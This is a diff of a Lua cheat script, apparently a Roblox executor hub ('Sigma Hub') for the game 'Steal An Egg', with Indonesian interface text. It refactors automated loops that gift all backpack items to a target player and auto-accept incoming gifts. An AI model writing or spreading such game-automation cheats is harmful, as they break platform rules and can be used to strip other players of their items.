+                Content = "Target UserID: " .. tostring(res),
                 Type    = "Success",
                 Duration = 3
             })
         else
-            task.spawn(function()
-                local ok, id = pcall(function() return Players:GetUserIdFromNameAsync(text) end)
-                if ok and id then
-                    Config.TargetPlayerId = id
-                    Library:Notify({
-                        Title   = "Target Username",
-                        Content = text .. " -> UserID: " .. id,
-                        Type    = "Success",
-                        Duration = 3
-                    })
-                else
-                    Library:Notify({
-                        Title   = "Error",
-                        Content = "Username '" .. text .. "' tidak ditemukan!",
-                        Type    = "Error",
-                        Duration = 3
-                    })
-                end
-            end)
+            Library:Notify({
+                Title   = "Error",
+                Content = "Player '" .. text .. "' tidak ditemukan!",
+                Type    = "Error",
+                Duration = 3
+            })
         end
     end
 end)
@@ -745,7 +956,6 @@ ActionSec:AddButton({
     
     task.spawn(function()
         for _, tool in ipairs(tools) do
-            -- Abaikan favorit jika toggle aktif
             if Config.IgnoreFavorites and tool:GetAttribute("Favorite") == true then
                 continue
             end
@@ -773,11 +983,11 @@ end)
 
 ActionSec:AddToggle({
     Name = "⚡ Auto Loop Trade Semua Item Terus Menerus",
-    Default = false,
+    Default = Config.AutoTradeLoop,
     Flag = "AutoTradeLoopToggle",
     Tooltip = "Terus memindai backpack & mengirim seluruh item otomatis ke target"
 }, function(Value)
-    Config.AutoTradeLoop = Value
+    StealAnEggTrade.SetAutoTrade(Value)
     if Value then
         Library:Notify({
             Title   = "Auto Trade Aktif",
@@ -785,33 +995,6 @@ ActionSec:AddToggle({
             Type    = "Success",
             Duration = 3
         })
-        
-        task.spawn(function()
-            while Config.AutoTradeLoop and getgenv().CurrentTradeScriptID == scriptId do
-                if Config.TargetPlayerId then
-                    local tools = StealAnEggTrade.GetAllTools()
-                    for _, tool in ipairs(tools) do
-                        if not Config.AutoTradeLoop then break end
-                        
-                        if Config.IgnoreFavorites and tool:GetAttribute("Favorite") == true then
-                            continue
-                        end
-                        
-                        local tName = tool.Name
-                        local ok, err = StealAnEggTrade.SendGift(Config.TargetPlayerId, tool)
-                        if ok then
-                            TradeStats.TotalSent = TradeStats.TotalSent + 1
-                            TradeStats.SuccessCount = TradeStats.SuccessCount + 1
-                            TradeStats.LastItemName = tName
-                        else
-                            TradeStats.FailCount = TradeStats.FailCount + 1
-                        end
-                        task.wait(Config.DelayBetweenGifts)
-                    end
-                end
-                task.wait(0.5)
-            end
-        end)
     else
         Library:Notify({
             Title   = "Auto Trade Dimatikan",
@@ -826,16 +1009,16 @@ end)
 -- Section 3: 📥 AUTO ACCEPT GIFT (PENERIMA / RECEIVER)
 local ReceiveSec = MainTab:AddSection("📥 Auto Accept Gift (Penerima)")
 
-local ReceiveStatusPara = ReceiveSec:AddParagraph("Status Auto Accept", "Auto Accept: Nonaktif (OFF) 🔴")
+local ReceiveStatusPara = ReceiveSec:AddParagraph("Status Auto Accept", Config.AutoAcceptGift and "Status: AKTIF (Menunggu Event 'Gifting: Request'...) 🟢" or "Status: NONAKTIF (OFF) 🔴")
 LastRequestPara = ReceiveSec:AddParagraph("Permintaan Masuk Terakhir", "Belum ada permintaan gift yang masuk.")
 
 ReceiveSec:AddToggle({
     Name = "⚡ Auto Accept Semua Permintaan Gift Otomatis",
-    Default = false,
+    Default = Config.AutoAcceptGift,
     Flag = "AutoAcceptToggle",
     Tooltip = "Menunggu event 'Gifting: Request' muncul lalu seketika mengirim 'Gifting: Response' (Accept)"
 }, function(Value)
-    Config.AutoAcceptGift = Value
+    StealAnEggTrade.SetAutoAccept(Value)
     if Value then
         ReceiveStatusPara:Set("Status Auto Accept", "Status: AKTIF (Menunggu Event 'Gifting: Request'...) 🟢")
         Library:Notify({
@@ -857,7 +1040,7 @@ end)
 
 ReceiveSec:AddToggle({
     Name = "🔒 Hanya Terima Dari Target Player (Whitelist)",
-    Default = false,
+    Default = Config.OnlyAcceptTarget,
     Flag = "WhitelistTargetToggle",
     Tooltip = "Jika aktif, hanya menerima gift dari UserID Target Player yang dipilih"
 }, function(Value)
@@ -876,7 +1059,7 @@ ReceiveSec:AddSlider({
     Name = "⏱️ Jeda Sebelum Accept (Detik)",
     Min = 0,
     Max = 2.0,
-    Default = 0.1,
+    Default = Config.AcceptDelay,
     Step = 0.1,
     Flag = "AcceptDelaySlider",
     Tooltip = "Waktu tunggu setelah event gift muncul sebelum memanggil remote accept"
@@ -939,7 +1122,6 @@ local InvDropdown = InvSec:AddDropdown({
         Config.SelectedInvTool = nil
         return 
     end
-    -- Cari tool yang cocok dengan nama pilihan
     local tools = StealAnEggTrade.GetAllTools()
     for _, t in ipairs(tools) do
         local info = StealAnEggTrade.GetToolInfo(t)
@@ -1002,7 +1184,6 @@ InvSec:AddButton({
         TradeStats.LastItemName = toolName
         Library:Notify({Title = "Terkirim!", Content = "Berhasil mengirim: " .. toolName, Type = "Success", Duration = 3})
         
-        -- Refresh dropdown setelah dikirim
         local scan = StealAnEggTrade.ScanInventory()
         InvDropdown:Refresh(scan.DropdownOptions)
     else
@@ -1016,7 +1197,6 @@ local InvCountPara = InvStatSec:AddParagraph("Total Tool", tostring(initialScan.
 local InvWeightPara = InvStatSec:AddParagraph("Total Berat", string.format("%.2f kg", initialScan.TotalWeight))
 local InvFavPara = InvStatSec:AddParagraph("Barang Favorit", tostring(initialScan.FavoriteCount) .. " Favorit ⭐")
 
--- Update Ringkasan Inventaris secara berkala
 task.spawn(function()
     while getgenv().CurrentTradeScriptID == scriptId do
         pcall(function()
@@ -1036,22 +1216,20 @@ end)
 local FilterTab = Window:MakeTab("🎯")
 local FilterSec = FilterTab:AddSection("Kriteria Filter Auto Trade")
 
--- Dropdown Item Name Filter
 local ItemNameDropdown = FilterSec:AddDropdown({
     Name = "Filter Berdasarkan Jenis Item",
     Options = initialScan.UniqueNames,
-    Default = "All Items",
+    Default = Config.FilterItem or "All Items",
     Flag = "FilterItemDropdown",
     Tooltip = "Pilih nama jenis item tertentu atau 'All Items'"
 }, function(selected)
     Config.FilterItem = selected or "All Items"
 end)
 
--- Dropdown Mutation Filter
 local MutationDropdown = FilterSec:AddDropdown({
     Name = "Filter Berdasarkan Mutasi",
     Options = initialScan.Mutations,
-    Default = "All Mutations",
+    Default = Config.FilterMutation or "All Mutations",
     Flag = "FilterMutationDropdown",
     Tooltip = "Pilih mutasi item (cth: Golden, Normal, etc.)"
 }, function(selected)
@@ -1073,10 +1251,9 @@ FilterSec:AddButton({
     })
 end)
 
--- Kolom Input Minimum Berat (Dalam Satuan Juta kg)
 FilterSec:AddInput({
     Name = "⚖️ Minimum Berat (Satuan: JUTA kg)",
-    Placeholder = "Cth: 1 (= 1.000.000 kg), 0.5 (= 500.000 kg), 0 = Bebas",
+    Placeholder = Config.MinWeight > 0 and string.format("%.2f", Config.MinWeight / 1000000) or "Cth: 1 (= 1.000.000 kg), 0.5 (= 500.000 kg), 0 = Bebas",
     Tooltip = "Input angka dalam satuan Juta kg. Contoh: 1 = 1.000.000 kg"
 }, function(text)
     local num = tonumber(text)
@@ -1099,10 +1276,9 @@ FilterSec:AddInput({
     end
 end)
 
--- Kolom Input Maximum Berat (Dalam Satuan JUTA kg) [Opsional]
 FilterSec:AddInput({
     Name = "⚖️ Maximum Berat (Satuan: JUTA kg) [Opsional]",
-    Placeholder = "Cth: 5 (= 5.000.000 kg), 0 = Bebas",
+    Placeholder = Config.MaxWeight > 0 and string.format("%.2f", Config.MaxWeight / 1000000) or "Cth: 5 (= 5.000.000 kg), 0 = Bebas",
     Tooltip = "Input angka dalam satuan Juta kg. 0 = Tanpa batas maksimum"
 }, function(text)
     local num = tonumber(text)
@@ -1127,7 +1303,7 @@ end)
 
 FilterSec:AddToggle({
     Name = "⭐ Abaikan Barang Favorit (Skip Favorite)",
-    Default = true,
+    Default = Config.IgnoreFavorites,
     Flag = "FilterIgnoreFavToggle",
     Tooltip = "Jangan kirim item yang ditandai Favorite"
 }, function(val)
@@ -1136,7 +1312,7 @@ end)
 
 FilterSec:AddToggle({
     Name = "🌟 Hanya Kirim Barang Favorit (Only Favorite)",
-    Default = false,
+    Default = Config.OnlyFavorites,
     Flag = "FilterOnlyFavToggle",
     Tooltip = "Hanya kirim item yang berstatus Favorite"
 }, function(val)
@@ -1147,7 +1323,7 @@ FilterSec:AddSlider({
     Name = "⏱️ Jeda Antar Gift (Detik)",
     Min = 0.1,
     Max = 3.0,
-    Default = 0.5,
+    Default = Config.DelayBetweenGifts,
     Step = 0.1,
     Flag = "FilterDelaySlider",
     Tooltip = "Waktu jeda antar pengiriman remote gift"
@@ -1159,7 +1335,6 @@ local FilterActionSec = FilterTab:AddSection("⚡ Eksekusi Auto Trade By Filter"
 
 local FilterMatchPara = FilterActionSec:AddParagraph("Status Pencocokan", "Memindai kecocokan filter...")
 
--- Updater status kecocokan filter
 task.spawn(function()
     while getgenv().CurrentTradeScriptID == scriptId do
         pcall(function()
@@ -1193,51 +1368,21 @@ FilterActionSec:AddButton({
     Name = "📦 Kirim Semua Item Sesuai Filter (1x Batch)",
     Tooltip = "Mengirim semua item di backpack yang cocok dengan kriteria filter"
 }, function()
-    if not Config.TargetPlayerId then
-        Library:Notify({Title = "Peringatan", Content = "Pilih Target Player terlebih dahulu di Tab ⚡!", Type = "Warning", Duration = 3})
-        return
+    local ok, count = StealAnEggTrade.GiftFilteredBatch()
+    if ok then
+        Library:Notify({Title = "Memulai Batch Filter", Content = "Mengirim " .. count .. " item sesuai filter...", Type = "Info", Duration = 3})
+    else
+        Library:Notify({Title = "Peringatan", Content = tostring(count), Type = "Warning", Duration = 3})
     end
-    
-    local tools = StealAnEggTrade.GetAllTools()
-    local matchedTools = {}
-    for _, t in ipairs(tools) do
-        if StealAnEggTrade.MatchesFilter(t, Config) then
-            table.insert(matchedTools, t)
-        end
-    end
-    
-    if #matchedTools == 0 then
-        Library:Notify({Title = "Tidak Ada Item Cocok", Content = "Tidak ada item di backpack yang cocok dengan filter!", Type = "Warning", Duration = 3})
-        return
-    end
-    
-    Library:Notify({Title = "Memulai Batch Filter", Content = "Mengirim " .. #matchedTools .. " item sesuai filter...", Type = "Info", Duration = 3})
-    
-    task.spawn(function()
-        for _, tool in ipairs(matchedTools) do
-            if not tool.Parent then continue end
-            local tName = tool.Name
-            local ok, err = StealAnEggTrade.SendGift(Config.TargetPlayerId, tool)
-            if ok then
-                TradeStats.TotalSent = TradeStats.TotalSent + 1
-                TradeStats.SuccessCount = TradeStats.SuccessCount + 1
-                TradeStats.LastItemName = tName
-            else
-                TradeStats.FailCount = TradeStats.FailCount + 1
-            end
-            task.wait(Config.DelayBetweenGifts)
-        end
-        Library:Notify({Title = "Batch Selesai", Content = "Pengiriman item sesuai filter telah selesai!", Type = "Success", Duration = 3.5})
-    end)
 end)
 
 FilterActionSec:AddToggle({
     Name = "🔁 Auto Loop Trade Khusus Sesuai Filter",
-    Default = false,
+    Default = Config.AutoTradeFilterLoop,
     Flag = "AutoTradeFilterLoopToggle",
     Tooltip = "Otomatis dan terus menerus mengirim hanya item yang lolos kriteria filter"
 }, function(Value)
-    Config.AutoTradeFilterLoop = Value
+    StealAnEggTrade.SetAutoTradeFilter(Value)
     if Value then
         Library:Notify({
             Title   = "Auto Trade Filter Aktif",
@@ -1245,32 +1390,6 @@ FilterActionSec:AddToggle({
             Type    = "Success",
             Duration = 3.5
         })
-        
-        task.spawn(function()
-            while Config.AutoTradeFilterLoop and getgenv().CurrentTradeScriptID == scriptId do
-                if Config.TargetPlayerId then
-                    local tools = StealAnEggTrade.GetAllTools()
-                    for _, tool in ipairs(tools) do
-                        if not Config.AutoTradeFilterLoop then break end
-                        
-                        -- Cek filter
-                        if StealAnEggTrade.MatchesFilter(tool, Config) then
-                            local tName = tool.Name
-                            local ok, err = StealAnEggTrade.SendGift(Config.TargetPlayerId, tool)
-                            if ok then
-                                TradeStats.TotalSent = TradeStats.TotalSent + 1
-                                TradeStats.SuccessCount = TradeStats.SuccessCount + 1
-                                TradeStats.LastItemName = tName
-                            else
-                                TradeStats.FailCount = TradeStats.FailCount + 1
-                            end
-                            task.wait(Config.DelayBetweenGifts)
-                        end
-                    end
-                end
-                task.wait(0.5)
-            end
-        end)
     else
         Library:Notify({
             Title   = "Auto Trade Filter Mati",
@@ -1327,7 +1446,7 @@ end)
 
 Library:Notify({
     Title   = "Sigma Hub Loaded!",
-    Content = "Steal An Egg Auto Trade & Accept siap digunakan.",
+    Content = string.format("Akun: %s (%s)", currentUsername, Config.ProfileRole or "Active"),
     Type    = "Success",
     Duration = 3.5
 })
